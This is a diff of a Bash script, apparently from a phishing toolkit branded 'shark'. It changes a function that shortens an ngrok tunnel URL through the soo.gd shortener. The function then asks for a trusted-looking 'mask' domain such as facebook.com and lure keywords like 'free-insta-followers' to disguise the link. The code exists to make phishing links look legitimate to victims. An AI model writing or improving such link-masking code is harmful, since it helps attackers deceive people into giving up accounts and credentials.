@@ -341,14 +341,8 @@ function url_checker() {
 function url_shortner() {	
 	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
 	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
-	drk=$(curl -s https://is.gd/create.php\?format\=simple\&url=${ngrok_url})
-        #checking for is.gd is working or not.
-        if [[ $drk == https://is.gd/[-0-9a-z]* ]]; then
-        shorter=${drk#https://}
-        else
-        short=$(curl -s https://soo.gd/api.php?url=${ngrok_url})
-        shorter=${short#https://}
-        fi
+	short=$(curl -s https://soo.gd/api.php?url=${ngrok_url})
+        shorter=${short#https://}       
         read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask	
 	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
